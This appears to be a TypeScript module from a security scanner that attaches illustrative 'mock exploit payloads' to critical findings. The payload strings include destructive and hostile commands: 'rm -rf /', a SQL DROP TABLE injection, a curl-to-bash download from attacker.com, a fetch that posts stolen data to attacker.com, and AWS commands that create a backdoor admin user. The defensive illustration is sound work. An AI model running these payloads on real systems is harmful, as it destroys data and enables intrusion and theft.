import type { Finding } from '../rules/types.js';

/**
 * Mock exploit payloads for critical vulnerabilities
 * Used to demonstrate the severity of security issues
 */

export interface ExploitPayload {
  vector: string;
  payload: string;
  impact: string;
}

const exploitPayloads: Record<string, ExploitPayload> = {
  'VG-SEC-001': {
    vector: 'Remote Code Execution',
    payload: `eval("require('child_process').exec('whoami')")`,
    impact: 'Attacker can execute arbitrary commands on the server',
  },
  'VG-SEC-002': {
    vector: 'SQL Injection',
    payload: `' OR 1=1; DROP TABLE users; --`,
    impact: 'Attacker can read, modify, or delete database data',
  },
  'VG-SEC-003': {
    vector: 'Credential Theft',
    payload: `<Extract hardcoded API key and use for unauthorized access>`,
    impact: 'Attacker gains unauthorized access to protected resources',
  },
  'VG-SEC-006': {
    vector: 'AWS Account Compromise',
    payload: `aws s3 ls --profile stolen-credentials`,
    impact: 'Full AWS account takeover, potential data breach and cost abuse',
  },
  'VG-SEC-007': {
    vector: 'AWS Secret Key Abuse',
    payload: `aws iam create-user --user-name backdoor`,
    impact: 'Create backdoor accounts, escalate privileges, steal data',
  },
  'VG-SEC-010': {
    vector: 'Private Key Compromise',
    payload: `ssh -i stolen_key user@target.com`,
    impact: 'Unauthorized server access, data exfiltration',
  },
  'VG-PY-001': {
    vector: 'Command Injection',
    payload: `; rm -rf / #`,
    impact: 'Execute arbitrary shell commands, full system compromise',
  },
  'VG-NODE-001': {
    vector: 'Command Injection',
    payload: `; curl attacker.com/malware.sh | bash`,
    impact: 'Remote code execution, malware installation',
  },
  'VG-WEB-001': {
    vector: 'CORS Exploitation',
    payload: `fetch('https://victim.com/api/secrets').then(r=>r.json()).then(d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(d)}))`,
    impact: 'Steal user data from any origin, session hijacking',
  },
  'VG-CLOUD-001': {
    vector: 'Data Exfiltration',
    payload: `aws s3 sync s3://public-bucket ./stolen-data`,
    impact: 'Download all sensitive data from public bucket',
  },
  'VG-CLOUD-002': {
    vector: 'Privilege Escalation',
    payload: `aws iam attach-user-policy --user-name victim --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
    impact: 'Gain full administrative access to AWS account',
  },
  'VG-CLOUD-003': {
    vector: 'Network Intrusion',
    payload: `nmap -sS -p- 0.0.0.0/0 && exploit vulnerable-service`,
    impact: 'Scan and exploit services exposed to internet',
  },
  'VG-CLOUD-007': {
    vector: 'Azure Storage Breach',
    payload: `az storage blob download-batch --source container --pattern *`,
    impact: 'Download all files from public Azure storage',
  },
};

/**
 * Generate exploit payload for a critical finding
 */
export function generateExploitPayload(finding: Finding): ExploitPayload | null {
  if (finding.severity !== 'critical') {
    return null;
  }

  return exploitPayloads[finding.ruleId] || {
    vector: 'Critical Security Vulnerability',
    payload: '<Exploit payload varies by context>',
    impact: 'Severe security risk - immediate remediation required',
  };
}

/**
 * Check if finding has an exploit payload
 */
export function hasExploitPayload(finding: Finding): boolean {
  return finding.severity === 'critical';
}
